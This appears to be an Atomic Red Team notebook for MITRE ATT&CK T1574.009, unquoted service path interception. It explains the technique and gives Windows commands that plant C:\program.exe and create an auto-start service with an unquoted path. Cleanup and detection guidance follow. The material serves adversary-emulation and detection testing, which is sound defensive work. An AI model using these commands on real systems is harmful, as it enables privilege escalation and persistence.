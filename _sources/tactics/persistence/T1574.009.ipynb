{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4f643a35",
   "metadata": {},
   "source": "# T1574.009 - Path Interception by Unquoted Path\nAdversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process."
  },
  {
   "cell_type": "markdown",
   "id": "f9c7470e",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f34b493a",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Execution of program.exe as service with unquoted service path",
    "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncopy PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe \"C:\\Program Files\\windows_service.exe\"\ncopy PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d6774f29",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.009 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "fa9f0140",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc stop \"Example Service\" >nul 2>&1\nsc delete \"Example Service\" >nul 2>&1\ndel \"C:\\Program Files\\windows_service.exe\" >nul 2>&1\ndel \"C:\\program.exe\" >nul 2>&1\ndel \"C:\\Time.log\" >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbf4df94",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.009 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dedd27c9",
   "metadata": {},
   "source": "## Detection\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}